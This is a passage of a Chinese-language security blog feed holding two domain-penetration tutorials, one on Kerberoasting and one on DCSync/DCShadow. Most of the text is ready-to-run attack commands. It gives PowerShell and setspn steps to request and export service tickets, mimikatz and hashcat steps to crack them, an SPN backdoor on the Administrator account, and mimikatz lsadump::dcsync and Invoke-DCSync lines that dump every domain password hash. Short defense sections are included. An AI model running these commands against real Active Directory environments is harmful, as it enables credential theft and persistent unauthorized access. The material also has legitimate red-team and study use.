CN=SQL,CN=Users,DC=zeolab,DC=local</span></span><br><span class="line"><span class="string">[*] ServicePrincipalName   : MSSQLSvc/SQL.zeolab.local</span></span><br><span class="line"><span class="string">[*] Hash                   : $krb5tgs$23$*$testlab.local$MSSQLSvc/SQL.zeolab.local*$E2B3869290......</span></span><br></pre></td></tr></table></figure><p>将哈希保存为hash.txt文件，放到hashcat的目录下。使用命令</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">hashcat64</span><span class="selector-class">.exe</span> <span class="selector-tag">-m</span> 13100 <span class="selector-tag">hash</span><span class="selector-class">.txt</span> <span class="selector-tag">pass</span><span class="selector-class">.txt</span></span><br></pre></td></tr></table></figure><p>离线破解服务票据</p><h5 id="1、获得有价值的SPN"><a href="#1、获得有价值的SPN" class="headerlink" title="1、获得有价值的SPN"></a>1、获得有价值的SPN</h5><p>需要满足以下条件：</p><ul><li>该SPN注册在域用户帐户(Users)下</li><li>域用户账户的权限很高</li></ul><p>可以选择以下三种方法：</p><h5 id="1-使用powershell模块Active-Directory"><a href="#1-使用powershell模块Active-Directory" class="headerlink" title="(1)使用powershell模块Active Directory"></a>(1)使用powershell模块Active Directory</h5><p><strong>注：</strong>powershell模块Active Directory 需要提前安装，域控制器一般会安装</p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">import-module </span><span class="string">ActiveDirectory</span></span><br><span class="line"><span class="string">get-</span><span class="string">aduser </span>-<span class="string">filter </span>&#123;<span class="string">AdminCount </span>-<span class="string">eq </span>1 -<span class="string">and </span>(<span class="string">servicePrincipalName </span>-<span class="string">ne </span>0)&#125; -<span class="string">prop </span>* |<span class="string">select </span><span class="string">name,</span><span class="string">whencreated,</span><span class="string">pwdlastset,</span><span class="string">lastlogon</span></span><br></pre></td></tr></table></figure><p>对于未安装Active Directory模块的系统，可以通过如下命令导入Active Directory模块：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import-<span class="keyword">module</span> .\<span class="module-access"><span class="module"><span class="identifier">Microsoft</span>.</span><span class="module"><span class="identifier">ActiveDirectory</span>.</span><span class="module"><span class="identifier">Management</span>.</span></span>dll</span><br></pre></td></tr></table></figure><p>Microsoft.ActiveDirectory.Management.dll在安装powershell模块Active Directory后生成，我已经提取出来并上传至github：</p><p><a href="https://github.com/3gstudent/test/blob/master/Microsoft.ActiveDirectory.Management.dll" target="_blank" rel="noopener">https://github.com/3gstudent/test/blob/master/Microsoft.ActiveDirectory.Management.dll</a></p><h4 id="2-使用PowerView"><a href="#2-使用PowerView" class="headerlink" title="(2)使用PowerView"></a>(2)使用PowerView</h4><p><a href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1" target="_blank" rel="noopener">https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1</a></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Get</span>-NetUser -spn -AdminCount|<span class="keyword">Select</span> <span class="type">name</span>,whencreated,pwdlastset,lastlogon</span><br></pre></td></tr></table></figure><h4 id="3-使用kerberoast"><a href="#3-使用kerberoast" class="headerlink" title="(3)使用kerberoast"></a>(3)使用kerberoast</h4><p>powershell:</p><p><a href="https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1" target="_blank" rel="noopener">https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1</a></p><p>vbs:</p><p><a href="https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.vbs" target="_blank" rel="noopener">https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.vbs</a></p><p>参数如下：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript <span class="module-access"><span class="module"><span class="identifier">GetUserSPNs</span>.</span></span>vbs</span><br></pre></td></tr></table></figure><h3 id="2、请求TGS"><a href="#2、请求TGS" class="headerlink" title="2、请求TGS"></a>2、请求TGS</h3><h4 id="1-请求指定TGS"><a href="#1-请求指定TGS" class="headerlink" title="(1)请求指定TGS"></a>(1)请求指定TGS</h4><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$SPNName</span> = <span class="string">'MSSQLSvc/DC1.test.com'</span></span><br><span class="line">Add-Type -AssemblyNAme System.IdentityModel</span><br><span class="line">New-Object System<span class="selector-class">.IdentityModel</span><span class="selector-class">.Tokens</span><span class="selector-class">.KerberosRequestorSecurityToken</span> -ArgumentList <span class="variable">$SPNName</span></span><br></pre></td></tr></table></figure><h4 id="2-请求所有TGS"><a href="#2-请求所有TGS" class="headerlink" title="(2)请求所有TGS"></a>(2)请求所有TGS</h4><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Add</span>-<span class="keyword">Type</span> -AssemblyName System.IdentityModel  </span><br><span class="line">setspn.exe -q */* | <span class="type">Select</span>-String '^CN' -<span class="keyword">Context</span> <span class="number">0</span>,<span class="number">1</span> | <span class="type">% &#123; New</span>-Object System. IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $<span class="keyword">_</span>.<span class="keyword">Context</span>.PostContext[<span class="number">0</span>].Trim() &#125;</span><br></pre></td></tr></table></figure><p>执行后输入<code>klist</code>查看内存中的票据，可找到获得的TGS</p><h3 id="3、导出"><a href="#3、导出" class="headerlink" title="3、导出"></a>3、导出</h3><p>使用mimikatz</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::<span class="built_in">list</span> /<span class="keyword">export</span></span><br></pre></td></tr></table></figure><h3 id="4、破解"><a href="#4、破解" class="headerlink" title="4、破解"></a>4、破解</h3><p><a href="https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py" target="_blank" rel="noopener">https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py</a></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./tgsrepcrack<span class="selector-class">.py</span> wordlist<span class="selector-class">.txt</span> test.kirbi</span><br></pre></td></tr></table></figure><h2 id="0x05-Kerberoasting的实现方法二"><a href="#0x05-Kerberoasting的实现方法二" class="headerlink" title="0x05 Kerberoasting的实现方法二"></a>0x05 Kerberoasting的实现方法二</h2><hr><p>自动实现，并且不需要mimikatz，普通用户权限即可，参考资料：</p><p><a href="http://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/" target="_blank" rel="noopener">http://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/</a></p><p>代码地址：</p><p><a href="https://github.com/EmpireProject/Empire/commit/6ee7e036607a62b0192daed46d3711afc65c3921" target="_blank" rel="noopener">https://github.com/EmpireProject/Empire/commit/6ee7e036607a62b0192daed46d3711afc65c3921</a></p><p>使用<code>System.IdentityModel.Tokens.KerberosRequestorSecurityToken</code>请求TGS，在返回结果中提取出TGS，输出的TGS可选择John the Ripper或Hashcat进行破解</p><p>实例演示：</p><p>在域内一台主机上以普通用户权限执行：</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Kerberoast -AdminCount -OutputFormat Hashcat <span class="string">| fl</span></span><br></pre></td></tr></table></figure><p>-AdminCount表示选择高权限的用户</p><p>输出结果如下图</p><p><img src="/2020/08/05/kerberosating-gong-ji-xue-xi/2-2.png" alt="Alt text"></p><p>只提取出hash的参数如下：</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Kerberoast -AdminCount -OutputFormat Hashcat | <span class="type">Select</span> hash | <span class="type">ConvertTo</span>-CSV -NoTypeInformation</span><br></pre></td></tr></table></figure><p>输出结果如下图</p><p><img src="/2020/08/05/kerberosating-gong-ji-xue-xi/2-3.png" alt="Alt text"></p><p>使用hashcat破解的参数如下：</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 13100 <span class="string">/tmp/hash.txt</span> <span class="string">/tmp/password.list</span> -o found.txt <span class="params">--force</span></span><br></pre></td></tr></table></figure><p>破解结果如下图，成功获得明文口令<code>MySQLAdmin111!</code></p><p><img src="/2020/08/05/kerberosating-gong-ji-xue-xi/2-4.png" alt="Alt text"></p><p><strong>注：</strong></p><p>Rubeus也可以实现Invoke-Kerberoast的功能，地址如下：</p><p><a href="https://github.com/GhostPack/Rubeus" target="_blank" rel="noopener">https://github.com/GhostPack/Rubeus</a></p><p>参数如下：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="module-access"><span class="module"><span class="identifier">Rubeus</span>.</span></span>exe kerberoast</span><br></pre></td></tr></table></figure><h2 id="0x06-Kerberoasting的后门利用"><a href="#0x06-Kerberoasting的后门利用" class="headerlink" title="0x06 Kerberoasting的后门利用"></a>0x06 Kerberoasting的后门利用</h2><hr><p>在我们取得了SPN的修改权限后，可以为指定的域用户添加一个SPN，这样可以随时获得该域用户的TGS，经过破解后获得明文口令</p><p>例如为域用户<code>Administrator</code>添加<code>SPNVNC/DC1.test.com</code>，参数如下：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn<span class="selector-class">.exe</span> -U -A VNC/DC1<span class="selector-class">.test</span><span class="selector-class">.com</span> Administrator</span><br></pre></td></tr></table></figure><p>如下图</p><p><img src="/2020/08/05/kerberosating-gong-ji-xue-xi/3-1.png" alt="Alt text"></p><p>在域内任意一台主机都能获得该SPN，并且能够使用Kerberoast获得TGS，如下图</p><p><img src="/2020/08/05/kerberosating-gong-ji-xue-xi/3-2.png" alt="Alt text"></p><p>再使用hashcat破解即可</p><p><strong>补充：</strong></p><p>删除SPN的参数如下：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn<span class="selector-class">.exe</span> -D VNC/DC1<span class="selector-class">.test</span><span class="selector-class">.com</span> Administrator</span><br></pre></td></tr></table></figure><h2 id="0x07-防御"><a href="#0x07-防御" class="headerlink" title="0x07 防御"></a>0x07 防御</h2><hr><p>Kerberoasting攻击的主要前提是口令复杂度较低、 加密算法强度较弱</p><p>对抗Kerberoasting攻击也需从这2方面开展:</p><ul><li>提高服务账号的口令复杂度；</li><li>尽量将域内的服务器系统升级至少至Windows 2008 系统，应用AES256高难度的加密算法.</li></ul><p>管理员可在域内一台主机上使用Invoke-Kerberoast检查是否存在危险的SPN</p><p>下载地址：</p><p><a href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1" target="_blank" rel="noopener">https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1</a></p><p>参数：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Get</span>-NetUser -spn -AdminCount|<span class="keyword">Select</span> <span class="type">name</span>,whencreated,pwdlastset,lastlogon</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h4&gt;&lt;p&gt;​        Kerberoasting攻击是Tim Medin在DerbyCon 2014 上发布的一种域口令攻击方法，Tim Med
      
    
    </summary>
    
    
      <category term="内网与域渗透学习" scheme="https://shu1l.github.io/categories/%E5%86%85%E7%BD%91%E4%B8%8E%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/"/>
    
    
  </entry>
  
  <entry>
    <title>DCSync与DCshadow攻击学习</title>
    <link href="https://shu1l.github.io/2020/08/05/dcsync-yu-dcshadow-gong-ji-xue-xi/"/>
    <id>https://shu1l.github.io/2020/08/05/dcsync-yu-dcshadow-gong-ji-xue-xi/</id>
    <published>2020-08-05T09:03:28.000Z</published>
    <updated>2021-08-20T04:42:41.957Z</updated>
    
    <content type="html"><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>DCSync与DCshadow是域渗透中经常会用到的技术。</p><h3 id="DCSync-攻击"><a href="#DCSync-攻击" class="headerlink" title="DCSync 攻击"></a>DCSync 攻击</h3><p>​    2015 年 8 月，Benjamin Delpy(神器 Mimikatz 的作者)和 Vincent Le Toux 发布了新版本的 Mimikatz，新增加了 DCSync 功能。模仿一个域控制器 DC，从真实的域控制器中请求获取数据，例如账号的口令散列值等数据。</p><p>​    DCSync 之前，获取域的账号口令信息，需要登录域服务器，在域服务器上运行代码才可以获取。</p><p>​    DCSync 的最大特点，在于不用登录域服务器，即可远程通过<strong>域数据同步复制</strong>的方式获得想要的用户口令信息。</p><p>​    需要注意的是，DCSync 攻击的对象如果是 RODC 域控制器，则会失效，因为 RODC是不能参与复制同步数据</p><h4 id="DCSync攻击原理"><a href="#DCSync攻击原理" class="headerlink" title="DCSync攻击原理"></a>DCSync攻击原理</h4><p>DCSync 的原理非常清晰，利用<strong>域控制器之间的数据同步复制</strong>。</p><ul><li>发现网络中的目标域控制器;</li><li>通过 DRS 服务的 GetNCChanges 接口发起数据同步请求，Directory Replication Service (DRS) Remote Protocol</li></ul><p>Samba wiki 关于 GetNCChanges 的描述包括:</p><p>​    当一个 DC (客户端 DC)想从其他 DC (服务端 DC)获取数据时，客户端 DC 会向服务端 DC 发起一个 GetNCChanges 请求。回应的数据包括需要同步的数据。</p><p>如果需要同步的数据比较多，则会重复上述过程。毕竟每次回应的数据有限。</p><h5 id="实现代码"><a href="#实现代码" class="headerlink" title="实现代码"></a>实现代码</h5><p><a href="https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/lsadump/kuhl_m_lsadump_dc.c#L27" target="_blank" rel="noopener">https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/lsadump/kuhl_m_lsadump_dc.c#L27</a></p><h4 id="DCSync攻击前提"><a href="#DCSync攻击前提" class="headerlink" title="DCSync攻击前提"></a>DCSync攻击前提</h4><p>一个用户想发起 DCSync 攻击，必须获得以下任一用户的权限：</p><ul><li>Administrators组内的用户</li><li>Domain Admins组内的用户</li><li>Enterprise Admins组内的用户</li><li>域控制器的计算机帐户</li></ul><p>即：默认情况下域管理员组具有该权限。</p><p><img src="/2020/08/05/dcsync-yu-dcshadow-gong-ji-xue-xi/20200507093022.png-water_print" alt="img"></p><p><img src="/2020/08/05/dcsync-yu-dcshadow-gong-ji-xue-xi/20200507093039.png-water_print" alt="img"></p><h4 id="DCSync攻击利用"><a href="#DCSync攻击利用" class="headerlink" title="DCSync攻击利用"></a>DCSync攻击利用</h4><h5 id="1-使用mimikatz"><a href="#1-使用mimikatz" class="headerlink" title="1.使用mimikatz"></a>1.使用mimikatz</h5><p>导出域内所有用户的hash：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe <span class="string">"lsadump::dcsync /domain:test.com /all /csv"</span> <span class="keyword">exit</span></span><br></pre></td></tr></table></figure><p><img src="/2020/08/05/dcsync-yu-dcshadow-gong-ji-xue-xi/20200507093111.png-water_print" alt="img"></p><p>导出域内administrator帐户的hash：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe <span class="string">"lsadump::dcsync /domain:test.com /user:administrator /csv"</span> <span class="keyword">exit</span></span><br></pre></td></tr></table></figure><h5 id="2-powershell实现"><a href="#2-powershell实现" class="headerlink" title="2.powershell实现"></a>2.powershell实现</h5><p><a href="https://gist.github.com/monoxgas/9d238accd969550136db" target="_blank" rel="noopener">https://gist.github.com/monoxgas/9d238accd969550136db</a></p><p>通过Invoke-ReflectivePEinjection调用mimikatz.dll中的dcsync功能</p><p>导出域内所有用户的hash：</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-DCSync -DumpForest <span class="string">| ft -wrap -autosize</span></span><br></pre></td></tr></table></figure><p>导出域内administrator帐户的hash：</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-DCSync -DumpForest -Users @(<span class="string">"administrator"</span>) | ft -<span class="keyword">wrap</span> -<span class="keyword">a</span></span><br></pre></td></tr></table></figure><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">lsadump:</span>:dcsync <span class="regexp">/domain:rd.adsecurity.org /</span><span class="string">user:</span>Administrator</span><br></pre></td></tr></table></figure><h4 id="DCSync防御"><a href="#DCSync防御" class="headerlink" title="DCSync防御"></a>DCSync防御</h4><p>DCSync 攻击的原理是模拟域控制器发起服务器之间的数据同步复制。</p><p>最好的防御方法是给域控制器设置白名单。在域内，域控制器的数量、IP地址、MAC 地址是非常明确清晰的资产，将这些资产设置在允许同步的白名单内。非白名单的 IP 不允许发生数据同步</p><p>获取域内所有IP的脚本:</p><p>powershell</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PowerShell:<span class="built_in">Get-ADDomainController</span> <span class="literal">-filter</span> * | select IPv4Address</span><br><span class="line">或</span><br><span class="line">[<span class="type">System.DirectoryServices.ActiveDirectory.Domain</span>]::GetCurrentDomain().DomainControllers | select IPAddress</span><br></pre></td></tr></table></figure><p>在网络设备上检测来自白名单以外的域控制器数据同步复制</p><h3 id="DCShadow-攻击"><a href="#DCShadow-攻击" class="headerlink" title="DCShadow 攻击"></a>DCShadow 攻击</h3><p>2018年1月24日，Benjamin Delpy(神器 Mimikatz 的作者)和 Vincent Le Toux 在 BlueHat IL 会议期间公布了针对域活动目录的一种新型攻击技术 <code>DCShadow</code></p><p>在<strong>具备域管理员权限条件</strong>下，攻击者可以<strong>创建伪造的域控制器</strong>，将预先设定的对象或对象属性复制到正在运行域服务器中。</p><p>DCSync 从域服务器复制出东西，DCShadow 是将数据复制至域服务器。</p><p>Luc Delsalle 对这种技术进行了验证和详细的描述，并就红蓝对抗中蓝队对抗此种攻击技术的缺陷和补救方法。</p><p>从 DCShadow 目前展示的功能来看，主要只能用于红蓝对抗的隐蔽后门。但是 DCShadow 第一次澄清和实现了伪造一个 DC 的最小需求合集，这个贡献非常大。以 前很多攻击方法都卡在不能伪造域服务器，例如 MS15-011 和 MS15-014 等，有了 <code>DCShadow</code> 的基础，相信将来会有很多新的攻击方法。</p><h4 id="DCShadow-攻击流程"><a href="#DCShadow-攻击流程" class="headerlink" title="DCShadow 攻击流程"></a>DCShadow 攻击流程</h4><p>根据 Luc Delsalle 的描述，DCShadow 的攻击过程包括 3 个主要个步骤:</p><p>1、在目标域的 AD 活动目录注册一个伪造的 DC 中;</p><p>2、使伪造的 DC 被其他的 DC 认可，能够参与域复制 ;</p><p>3、强制触发域复制，将指定的新对象或修改后的对象属性同步复制到其他 DC 中;</p><h4 id="注册伪造的DC"><a href="#注册伪造的DC" class="headerlink" title="注册伪造的DC"></a>注册伪造的DC</h4><p>一台机器要想注册成为域中的一台 DC 服务器，需要在域的活动目录中注册一个 <code>NTDS-DSA(nTDSDSA)</code>类对象。注册的位置为 <code>CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=adsec,DC=com</code></p><p><img src="/2020/08/05/dcsync-yu-dcshadow-gong-ji-xue-xi/20200507100302.png-water_print" alt="img"></p><p>adsec.com 域有 3 台域服务器，分别是 LABDC01、RESDC01 及 WIN2016-DC01，标红的正是我们实验环境的域服务器。我们测试的机器为 Win7X86cn04，测试成功的则会生成一个新的NTDS-DSA(nTDSDSA)类对象</p><p><img src="/2020/08/05/dcsync-yu-dcshadow-gong-ji-xue-xi/20200507100638.png-water_print" alt="img"></p><p>查看 <code>CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=adsec,DC=com</code>的安全描述符，可知必须有<code>域管理员权限</code>才具备<code>写</code>权限</p><p>所以发动 DCShadow 攻击首先必须具备域管理员权限，但是我们可以通实验，做点手脚，就会好办一些，例如将完全权限赋予普通用户，则普通用户也可以修改</p><p><img src="/2020/08/05/dcsync-yu-dcshadow-gong-ji-xue-xi/20200507100807.png-water_print" alt="img"></p><p><img src="/2020/08/05/dcsync-yu-dcshadow-gong-ji-xue-xi/20200507100835.png-water_print" alt="img"></p><p>DC Shadow 源码：</p><p><img src="/2020/08/05/dcsync-yu-dcshadow-gong-ji-xue-xi/20200507100956.png-water_print" alt="img"></p><h4 id="注册的DC被其他DC认可，能够参与域复制"><a href="#注册的DC被其他DC认可，能够参与域复制" class="headerlink" title="注册的DC被其他DC认可，能够参与域复制"></a>注册的DC被其他DC认可，能够参与域复制</h4><p>一个刚注册的 DC 要想被域中其他DC认可，能够参与域复制，需要满足 3 个条件:</p><ul><li>这台伪造 DC 具备认证凭证，能认证到域，即有域内账号，可以使用机器账号，实验环境中为 <code>WIN7X86CN04$</code>;</li><li>伪造 DC 能认证其他 DC 来访问的账号，如果我们给 <code>WIN7X86CN04$</code> 添加 <code>SPN</code>，则可以实现这一点。关键是需要添加哪些SPN，DCShadow 的一个大贡献是找到 了 SPN 的最小合集，只需要 2 个即可:<code>DRS</code>服务(GUID 为 E3514235–4B06–11D1-AB04–00C04FC2DCD2) 和 <code>GS</code>(Global Catalog)服务</li></ul><p><img src="/2020/08/05/dcsync-yu-dcshadow-gong-ji-xue-xi/20200507101146.png-water_print" alt="img"></p><ul><li>运行DRS服务，最少需要实现 IDL_DRSBind、IDL_DRSUnbind、IDL_DRSGetNCChanges、IDL_DRSUpdateRefs 这 4 个 RPC 接口，以便其他 DC 能够通过 RPC 获取需要复制的数据。Mimikatz 工具的最新版已经集成了这 4 个接口</li></ul><h4 id="强制立即发起域复制"><a href="#强制立即发起域复制" class="headerlink" title="强制立即发起域复制"></a>强制立即发起域复制</h4><p>​    通常负责域复制和同步的进程是 KCC 进程，默认时间是 15 分钟校验一次，如果需要复制则发起;也可以使用 Windows 域服务器自带的系统工具 repadmin，该工具会调用 DRSReplicaAdd 函数接口强制立即发起域复制，DCShadow 正是通过调用 DRSReplicaAdd 函数强制立即发起域复制</p><p><img src="/2020/08/05/dcsync-yu-dcshadow-gong-ji-xue-xi/20200507101534.png-water_print" alt="img"></p><h4 id="攻击复现"><a href="#攻击复现" class="headerlink" title="攻击复现"></a>攻击复现</h4><p>查看 <code>CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=adsec,DC=com</code> 的安全描述符，可知必须有域管理员权限才具备写权限</p><p>所以发动 <code>DCShadow</code> 攻击首先必须具备域管理员权限，但是我们可以通实验，做点手脚，就会好办一些，例如将完全权限赋予普通用户，则普通用户也可以修改</p><p><img src="/2020/08/05/dcsync-yu-dcshadow-gong-ji-xue-xi/20200507101621.png-water_print" alt="img"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h4&gt;&lt;p&gt;DCSync与DCshadow是域渗透中经常会用到的技术。&lt;/p&gt;
&lt;h3 id=&quot;DCSync-攻击&quot;&gt;&lt;a href=&quot;#DCSync-
      
    
    </summary>
    
    
      <category term="内网与域渗透学习" scheme="https://shu1l.github.io/categories/%E5%86%85%E7%BD%91%E4%B8%8E%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="域渗透" scheme="https://shu1l.github.io/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
</feed>
